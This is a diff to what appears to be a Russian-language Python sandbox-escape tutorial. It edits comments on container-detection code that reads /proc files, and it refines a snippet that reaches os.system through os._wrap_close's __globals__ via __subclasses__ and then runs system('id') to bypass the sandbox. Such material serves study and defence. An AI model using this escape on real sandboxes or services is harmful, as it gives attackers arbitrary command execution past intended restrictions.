@@ -358,7 +358,7 @@ info = {
 try:
     with open("/proc/self/cmdline", "rb") as f:
         info["cmdline"] = f.read().replace(b"\x00", b" ").decode()
-    with open("/proc/1/cgroup") as f:
+    with open("/proc/1/cgroup") as f:    # /proc/1/cgroup — cgroup init-процесса (PID 1), обнаруживает Docker-контейнер
         info["cgroup"] = f.read()[:500]
     info["dockerenv"] = os.path.exists("/.dockerenv")
 except Exception:
@@ -521,14 +521,12 @@ print("провалены проверки:", failed or "нет")
 ### Поиск класса с доступом к `os` { #poisk }
 
 ```python
-# Найти os._wrap_close (он создаётся при os.popen и держит ссылку на os)
+# Найти os._wrap_close — это класс в модуле os; его инстансы возвращаются из os.popen(),
+# а в __init__ есть self.__init__.__globals__ — словарь модуля os!
 for cls in ().__class__.__base__.__subclasses__():
     if cls.__name__ == "_wrap_close":
-        # У этого класса в __init__ есть self.__init__.__globals__ —
-        # это globals модуля os!
-        os_globals = cls.__init__.__globals__
-        os = os_globals  # это словарь globals модуля os
-        system = os["system"]   # функция os.system
+        os_g = cls.__init__.__globals__   # это словарь globals модуля os
+        system = os_g["system"]          # функция os.system
         break
 
 system("id")   # обходим песочницу, выполняем произвольную команду
